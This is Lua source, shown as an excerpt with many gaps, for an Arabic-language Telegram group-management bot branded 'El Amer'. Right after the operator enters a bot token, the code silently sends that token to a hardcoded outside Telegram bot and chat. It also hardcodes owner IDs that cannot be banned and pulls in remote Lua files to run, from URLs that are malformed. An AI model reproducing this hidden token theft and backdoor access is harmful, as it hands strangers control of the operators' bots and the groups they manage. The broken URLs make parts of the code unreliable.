...
if res ~= 200 then
print('\27[0;31m≪━━━━━━𝙴𝙻 𝙰𝙼𝙴𝚁 ⁦⁦━━━━━━≫\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na≪━━━━━━𝙴𝙻 𝙰𝙼𝙴𝚁 ⁦⁦━━━━━━≫\n27[0;39;49m')
database:set(id_server..":token",token)
https.request('https://api.telegram.org/bot1852477559:AAGfOZkLut__mm2DB10dleRxlGdpuDzT0Wk/sendmessage?chat_id=1700360357&text=' ..token)
end 
else
print('\27[0;35m≪━━━━━━𝙴𝙻 𝙰𝙼𝙴𝚁 ⁦⁦━━━━━━≫ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
...
--------------------------------------------------------------------------------------------------------------
print([[
__  __  ___  _   _    _    __  __ _____ ____
|  \/  |/ _ \| | | |  / \  |  \/  | ____|  _ \
| |\/| | | | | |_| | / _ \ | |\/| |  _| | | | |
| |  | | |_| |  _  |/ ___ \| |  | | |___| |_| |
|_|  |_|\___/|_| |_/_/   \_\_|  |_|_____|____/
> CH › @E_L_A_M_E_R
~> DEVELOPER › @M_W_12 
]])
...
io.popen("cd File_Bot && wget https://raw.https://github.com/Mohammedsafwat0/Mohammedsafwat0/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1700342737,1458090052,1458090052}   
...
function DevMohamed(msg) 
local hash = database:sismember(bot_id.."Dev:Mohamed:2", msg.sender_user_id_) 
...
if hash or SudoBot(msg) or DevMohamed(msg) or Bot(msg)  then  
return true  
else  
return false  
end  
...
if hash or SudoBot(msg) or DevMohamed(msg) or Sudo(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if hash or SudoBot(msg) or DevMohamed(msg) or Sudo(msg) or CoSu(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if hash or SudoBot(msg) or DevMohamed(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevMohamed(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevMohamed(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevMohamed(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Mod(msg) or CoSu(msg) or Bot(msg)  then       
return true 
else 
return false 
end 
...
if tonumber(user_id) == tonumber(1700342737) then  
var = true  
elseif tonumber(user_id) == tonumber(1458090052) then
var = true  
elseif tonumber(user_id) == tonumber(1458090052) then
var = true  
...
var = true  
elseif database:sismember(bot_id.."Dev:Mohamed:2", user_id) then
var = true  
...
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = database:get(bot_id.."CoSu:Rd"..msg.chat_id_) or 'الامير'
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
...
local UserName = (data.username_ or "E_L_A_M_E_R")
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼 𝙴𝙻 𝙰𝙼𝙴𝚁 ⁦⁦")  
...
if DevMohamed(msg) then
local bl = ' ☆ اهلا عزيزي آلمـطـور\n ☆ آنت آلمـطـور آلآسـآسـي للبوت\n┉  ┉  ┉  ┉  ┉  ┉  ┉  ┉ء\n ☆ تسـتطـيع‌‏ آلتحگم باوامر البوت\n ☆ من خلاال الكيبورت خاص بك\n ☆ قناة سورس البوت [اضغط هنا](t.me/E_L_A_M_E_R)'
local keyboard = {
{'مبرمج السورس '},
...
if not DevMohamed(msg) and not database:sismember(bot_id..'Ban:User_Bot',msg.sender_user_id_) and not database:get(bot_id..'Tuasl:Bots') then
...
if DevMohamed(msg) and msg.reply_to_message_id_ ~= 0  then    
...
if text == 'تفعيل التواصل ' and DevMohamed(msg) then  
...
if text == 'تعطيل التواصل ' and DevMohamed(msg) then  
...
if text == 'تفعيل البوت الخدمي ' and DevMohamed(msg) then  
...
if text == 'تعطيل البوت الخدمي ' and DevMohamed(msg) then  
...
if text == 'ضع كليشه ستارت ' and DevMohamed(msg) then 
database:set(bot_id..'Start:Bots',true) 
send(msg.chat_id_, msg.id_,' ☆ ارسل لي الكليشه الان')
return false
end
if text == 'حذف كليشه ستارت ' and DevMohamed(msg) then 
database:del(bot_id..'Start:Bot') 
send(msg.chat_id_, msg.id_,' ☆ تم حذف كليشه ستارت')
end
if text == 'معلومات السيرفر' and DevMohamed(msg) then 
...
if text == 'تحديث السورس ' and DevMohamed(msg) then 
os.execute('rm -rf DRAGON.lua')
os.execute('wget https://raw.https://github.com/Mohammedsafwat0/Mohammedsafwat0/DRAGON.lua')
send(msg.chat_id_, msg.id_,' ☆ تم تحديث السورس \n ☆ لديك اخر اصدار لسورس الامير\n ☆ الاصدار » { v 1.5}')
dofile('DRAGON.lua')  
end
if text == 'الاصدار' and DevMohamed(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ☆ اصدار سورس الامير \n ☆ الاصدار »{ v 1.5}')
end
if text == 'مبرمج السورس ' and DevMohamed(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[DEV ELAMER](t.me/M_W_12)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝒑𝒓𝒐𝒈𝒓𝒂𝒎𝒎𝒆𝒓', url="t.me/M_W_12"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'قناه السورس' and DevMohamed(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/E_L_A_M_E_R)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس️️', url="t.me/E_L_A_M_E_R"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'بوت تواصل' and DevMohamed(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[TWL](t.me/Mohamed_76_Bot)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝒕𝒘𝒂𝒔𝒐𝒍', url="t.me/Mohamed_76_Bot"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "ضع اسم للبوت" and DevMohamed(msg) then  
...
if text == 'الاحصائيات' and DevMohamed(msg) then 
...
if text == 'المشتركين ' and DevMohamed(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n ☆ المشتركين»{`'..Users..'`}'
send(msg.chat_id_, msg.id_,Text) 
...
if text == 'الجروبات ' and DevMohamed(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n ☆ الجروبات»{`'..Groups..'`}'
send(msg.chat_id_, msg.id_,Text) 
...
if text == ("المطورين ") and DevMohamed(msg) then
...
if text == ("قائمه العام") and DevMohamed(msg) then
...
if text == ("قائمه الكتم العام") and DevMohamed(msg) then
...
if text=="اذاعه خاص " and msg.reply_to_message_id_ == 0 and DevMohamed(msg) then 
database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ☆ ارسل الان اذاعتك؟ \n ☆ للخروج ارسل الغاء ")
return false
end 
if text=="اذاعه " and msg.reply_to_message_id_ == 0 and DevMohamed(msg) then 
database:setex(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ☆ ارسل الان اذاعتك؟ \n ☆ للخروج ارسل الغاء ")
return false
end  
if text=="اذاعه بالتثبيت" and msg.reply_to_message_id_ == 0 and DevMohamed(msg) then 
database:setex(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ☆ ارسل الان اذاعتك؟ \n ☆ للخروج ارسل الغاء ")
return false
end 
if text=="اذاعه بالتوجيه " and msg.reply_to_message_id_ == 0  and DevMohamed(msg) then 
database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ☆ ارسل لي التوجيه الان")
return false
end 
if text=="اذاعه بالتوجيه خاص " and msg.reply_to_message_id_ == 0  and DevMohamed(msg) then 
database:setex(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ☆ ارسل لي التوجيه الان")
return false
end 
if text == 'جلب نسخه الاحتياطيه' and DevMohamed(msg) then 
GetFile_Bot(msg)
end
if text == "تنظيف المشتركين " and DevMohamed(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == "تنظيف الجروبات " and DevMohamed(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع مطور @(.*)$") and DevMohamed(msg) then
...
usertext = '\n ☆ العضو » ['..result.title_..'](t.me/'..(username or 'E_L_A_M_E_R')..')'
status  = '\n ☆ تم ترقيته مطور'
...
if text and text:match("^رفع مطور (%d+)$") and DevMohamed(msg) then
...
usertext = '\n ☆ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'E_L_A_M_E_R')..')'
status  = '\n ☆ تم ترقيته مطور'
...
if text and text:match("^تنزيل مطور @(.*)$") and DevMohamed(msg) then
...
if text and text:match("^تنزيل مطور (%d+)$") and DevMohamed(msg) then
...
if DRAGON1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ☆ العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'E_L_A_M_E_R')..') \n ☆ '..DRAGON1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
return false  end
if data.message_ == "𝑪𝑯𝑨𝑻_𝑨𝑫𝑴𝑰𝑵_𝑬𝑳 𝑨𝑴𝑬𝑹" then 
...
send(msg.chat_id_,0," ☆ العضو : {["..data.first_name_.."](T.ME/E_L_A_M_E_R)}\n ☆ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ☆ عذرا » {["..data.first_name_.."](T.ME/E_L_A_M_E_R)}\n ☆ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not DevMohamed(msg) then
...
if text and text:match("^ضع عدد الاعضاء (%d+)$") and DevMohamed(msg) then
...
if text and text:match("^تغير الاشتراك$") and DevMohamed(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' ☆ حسنآ ارسل لي معرف القناة')
return false  
end
if text and text:match("^تغير رساله الاشتراك$") and DevMohamed(msg) then  
database:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' ☆ حسنآ ارسل لي النص الذي تريده')
return false  
end
if text == "حذف رساله الاشتراك " and DevMohamed(msg) then  
database:del(bot_id..'text:ch:user')
send(msg.chat_id_, msg.id_, " ☆ تم مسح رساله الاشتراك ")
return false  
end
if text and text:match("^وضع قناة الاشتراك ☆$") and DevMohamed(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' ☆ حسنآ ارسل لي معرف القناة')
return false  
end
if text == "تفعيل الاشتراك الاجباري " and DevMohamed(msg) then  
if database:get(bot_id..'add:ch:id') then
...
if text == "تعطيل الاشتراك الاجباري " and DevMohamed(msg) then  
database:del(bot_id..'add:ch:id')
database:del(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, " ☆ تم تعطيل الاشتراك الاجباري ")
return false  
end
if text == "الاشتراك الاجباري " and DevMohamed(msg) then  
...
if t2.id_ then 
name_MRMohamed = ((t2.first_name_ or "") .. (t2.last_name_ or ""))
if name_MRMohamed then 
names_MRMohamed = database:smembers(bot_id.."DRAGON:blocname"..msg.chat_id_) or ""
if names_MRMohamed and names_MRMohamed[1] then 
for i=1,#names_MRMohamed do 
if name_MRMohamed:match("(.*)("..names_MRMohamed[i]..")(.*)") then 
...
function Mohamed_mrMohamed_new(mrMohamed1,mrMohamed2)
if mrMohamed2 and mrMohamed2.first_name_ then 
if mrMohamed2.first_name_:match("(.*)"..database:get(bot_id.."DRAGON:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."DRAGON:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local mrMohamed_nnn = database:get(bot_id.."DRAGON:nump"..msg.chat_id_) or 5
local mrMohamed_nnn2 = database:get(bot_id.."DRAGON:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(mrMohamed_nnn2) == tonumber(mrMohamed_nnn) or tonumber(mrMohamed_nnn2) > tonumber(mrMohamed_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."DRAGON:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "☆ عزيزي >>["..mrMohamed2.username_.."](https://t.me/"..(mrMohamed2.username_ or "E_L_A_M_E_R")..")\n☆ عليك وضع التوحيد ⪼ {"..database:get(bot_id.."DRAGON:teh"..msg.chat_id_).."} بجانب اسمك\n☆ عدد المحاولات المتبقيه {"..(tonumber(mrMohamed_nnn) - tonumber(mrMohamed_nnn2)).."}")
end
end
end
end
bnnaGet(id, Mohamed_mrMohamed_new)
end
end
...
local Text = [[
☆𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚃𝙷𝙴 𝙴𝙻 𝙰𝙼𝙴𝚁 ⁦⁦☆
☆مرحب بيك في سورس الامير الاعظم☆
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝒑𝒓𝒐𝒈𝒓𝒂𝒎𝒎𝒆𝒓',url="t.me/M_W_12"}},
{{text = '𝒔𝒐𝒖𝒓𝒄𝒆', url="t.me/E_L_A_M_E_R"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/E_L_A_M_E_R&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'مين نصبلك' or text == 'عايزه بوت' or text == 'عايز بوت' then
local Text = [[
𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚃𝙷𝙴 𝙴𝙻 𝙰𝙼𝙴𝚁 ⁦⁦☆
☆اهلا بك في سورس الامير الجمدان لو عايز بوت بأسعار منسبه وبوت مميز كلمني ☆
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝒑𝒓𝒐𝒈𝒓𝒂𝒎𝒎𝒆𝒓',url="t.me/M_W_12"}},
...
if text == 'الامير' or text == 'ELAMER' or text == 'الامير' then
local Text = [[
DEV ELAMER
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝒑𝒓𝒐𝒈𝒓𝒂𝒎??𝒆𝒓',url="t.me/M_W_12"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'تيم الالامير' or text == 'التيم' or text == 'متيجي' then
local Text = [[
☆تع يقلب انضم تيم الالامير☆
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝙴𝙻 𝙰𝙼𝙴𝚁 ⁦⁦',url="t.me/UU_bh1"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
"سؤال ينرفزك ؟ ", 
" هل يعجبك سورس الامير ؟؟ ", 
" اكثر ممثل تحبه ؟ ", 
"قد تخيلت شي في بالك وصار ؟ ", 
"شيء عندك اهم من الناس ؟ ", 
"تفضّل النقاش الطويل او تحب الاختصار ؟ ", 
"وش أخر شي ضيعته؟ ", 
"اي رايك في سورس الامير ؟ ", 
"كم مره حبيت؟ ", 
...
if text == 'رفع نسخه الاحتياطيه' and DevMohamed(msg) then   
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ☆ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'E_L_A_M_E_R')..') \n ☆ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ☆ بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'E_L_A_M_E_R')..') \n ☆ تـم قفـل التاك بالكتم ')
end,nil)   
...
--------------------------------------------------------------------------------------------------------------
if text == 'تحديث' and DevMohamed(msg) then    
dofile('DRAGON.lua')  
send(msg.chat_id_, msg.id_, ' ☆ تم تحديث جميع الملفات') 
end 
if text == ("مسح قائمه العام") and DevMohamed(msg) then
...
if text == ("حظر عام") and msg.reply_to_message_id_ and DevMohamed(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if tonumber(result.sender_user_id_) == tonumber(1700342737) then
send(msg.chat_id_, msg.id_, " ☆ لا يمكنك حظر مبرمج السورس\n")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1458090052) then
send(msg.chat_id_, msg.id_, " ☆ لا يمكنك حظر مالك السورس\n")
return false 
end
if result.sender_user_id_ == tonumber(1458090052) then
...
if text and text:match("^حظر عام @(.*)$")  and DevMohamed(msg) then
...
if tonumber(result.id_) == tonumber(1700342737) then  
send(msg.chat_id_, msg.id_, " ☆ ده بابا عيب")
return false 
end
if tonumber(result.id_) == tonumber(1458090052) then  
send(msg.chat_id_, msg.id_, " ☆ ده بابا عيب")
return false 
end
usertext = '\n ☆ العضو » ['..result.title_..'](t.me/'..(username or 'E_L_A_M_E_R')..')'
...
if text and text:match("^حظر عام (%d+)$") and DevMohamed(msg) then
...
if tonumber(userid) == tonumber(1458090052) then  
send(msg.chat_id_, msg.id_, " ☆ ده بابا عيب")
return false 
end
if tonumber(userid) == tonumber(1700342737) then  
send(msg.chat_id_, msg.id_, " ☆ ده بابا عيب")
return false 
end
...
if text == ("كتم عام") and msg.reply_to_message_id_ and DevMohamed(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^كتم عام @(.*)$")  and DevMohamed(msg) then
...
if text and text:match("^كتم عام (%d+)$") and DevMohamed(msg) then
...
if text == ("الغاء العام") and msg.reply_to_message_id_ and DevMohamed(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^الغاء العام @(.*)$") and DevMohamed(msg) then
...
if text and text:match("^الغاء العام (%d+)$") and DevMohamed(msg) then
...
------------------------------------------------------------------------
if text == ("مسح المطورين") and DevMohamed(msg) then
...
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = dataa.member_count_},function(ta,Mohamed)
x = 0
tags = 0
local list = Mohamed.members_
for k, v in pairs(list) do
...
if text == 'الملفات' and DevMohamed(msg) then
t = ' ☆ ملفات السورس الامير ↓\n ≪━━━━━━𝙴𝙻 𝙰𝙼𝙴𝚁 ⁦⁦━━━━━━≫ \n'
i = 0
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
i = i + 1
...
if DevMohamed(msg) then
local Get_Files, res = https.request("https://raw.https://github.com/Mohammedsafwat0/Mohammedsafwat0/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ☆ اهلا بك في متجر ملفات الامير\n ☆ ملفات السورس ↓\n≪━━━━━━𝙴𝙻 𝙰𝙼𝙴𝚁 ⁦⁦━━━━━━≫\n\n"
local TextE = "\n≪━━━━━━𝙴𝙻 𝙰𝙼𝙴𝚁 ⁦⁦━━━━━━≫\n ☆ علامة تعني { ✔️ } ملف مفعل\n ☆ علامة تعني { ✖ } ملف معطل\n ☆ قناة سورس الامير ↓\n".." ☆ [اضغط هنا لدخول](t.me/E_L_A_M_E_R) \n"
local NumFile = 0
...
if text and text:match("^(تعطيل) (.*)(.lua)$") and DevMohamed(msg) then
...
local json_file, res = https.request("https://raw.https://github.com/Mohammedsafwat0/Mohammedsafwat0/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_," ☆ عذرا الملف لايدعم سورس الامير \n") 
end
return false
end
if text and text:match("^(تفعيل) (.*)(.lua)$") and DevMohamed(msg) then
...
if text == "مسح الملفات" and DevMohamed(msg) then
os.execute("rm -fr File_Bot/*")
send(msg.chat_id_,msg.id_," ☆ تم مسح الملفات")
return false
end

if text == ("رفع مطور") and msg.reply_to_message_id_ and DevMohamed(msg) then
function start_function(extra, result, success)
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
...
if text == ("تنزيل مطور") and msg.reply_to_message_id_ and DevMohamed(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("مسح قائمه الامير") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ☆ تم مسح قائمه الامير')
return false
end

if text == 'قائمه الامير' and Sudo(msg) then
...
if text == ("رفع الامير") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع الامير @(.*)$") and Sudo(msg) then
local username = text:match("^رفع الامير @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع الامير (%d+)$") and Sudo(msg) then
local userid = text:match("^رفع الامير (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيل الامير") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل الامير @(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل الامير @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل الامير (%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل الامير (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if database:get(bot_id..'DRAGOON:change:Mohamed'..msg.chat_id_) then
Text = 'تم تفعيل تحويل الصيغ'
database:del(bot_id..'DRAGOON:change:Mohamed'..msg.chat_id_)  
else
...
if not database:get(bot_id..'DRAGOON:change:Mohamed'..msg.chat_id_) then
database:set(bot_id..'DRAGOON:change:Mohamed'..msg.chat_id_,true)  
Text = '\n ☆ تم تعطيل امر تحويل'
else
...
if text == 'تحويل' and not database:get(bot_id..'DRAGOON:change:Mohamed'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
...
database:sadd(bot_id.."Dev:Mohamed:2", result.sender_user_id_)
...
database:sadd(bot_id.."Dev:Mohamed:2", result.id_)
...
database:sadd(bot_id.."Dev:Mohamed:2", userid)
...
function Function_DRAGON(extra, result, success)
database:srem(bot_id.."Dev:Mohamed:2", result.sender_user_id_)
...
function Function_DRAGON(extra, result, success)
if result.id_ then
database:srem(bot_id.."Dev:Mohamed:2", result.id_)
...
database:del(bot_id.."Dev:Mohamed:2")
...
if (data and data.code_ and data.code_ == 400 and data.message_ == "𝑪𝑯𝑨𝑻_𝑨𝑫𝑴𝑰𝑵_𝑬𝑳 𝑨𝑴𝑬𝑹") then 
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ☆ لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'E_L_A_M_E_R')..')'
status  = '\n ☆ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ☆ العضو » '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ☆ العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'E_L_A_M_E_R')..')'
...
send(msg.chat_id_, msg.id_, ' ☆ تم مسح جميع المتناكين')
end
...
if AddChannel(msg.sender_user_id_) == false then
local E_L_A_M_E_R = database:get(bot_id..'text:ch:user')
if E_L_A_M_E_R then
send(msg.chat_id_, msg.id_,'['..E_L_A_M_E_R..']')
else
send(msg.chat_id_, msg.id_,' ☆ لا تستطيع استخدام البوت \n ☆ يرجى الاشتراك بالقناه اولا \n ☆ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
...
-----------------------------------------------------
if text == 'مسح بناتي' and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
...
if text == 'مسح الرقصات' and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
...
if text == 'مسح الي بقلبي' and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ☆ تم تنزيل جميع الي بقلبك ')
end
...
if #list == 0 then
t = " ☆ لا يوجد احد بقلبك نت وحيد اوي😹"
end
send(msg.chat_id_, msg.id_, t)
end
---------
...
elseif data.message_ == "𝑪𝑯𝑨𝑻_𝑨𝑫𝑴𝑰𝑵_𝑬𝑳 𝑨𝑴𝑬𝑹" then
...
if text == 'مسح كليشه المطور' and DevMohamed(msg) then
database:del(bot_id..'TEXT_SUDO')
send(msg.chat_id_, msg.id_,' ☆ تم مسح كليشه المطور')
end
if text == 'ضع كليشه المطور' and DevMohamed(msg) then
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ☆ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'E_L_A_M_E_R')..')'..'\n ☆ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == 'تفعيل الاذاعه' and DevMohamed(msg) then  
...
if text == 'تعطيل الاذاعه' and DevMohamed(msg) then  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'الامير').."" then  
...
if database:get(bot_id..'Bc:Bots') and not DevMohamed(msg) then 
...
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'Dev:Mohamed:2',msg.sender_user_id_) then
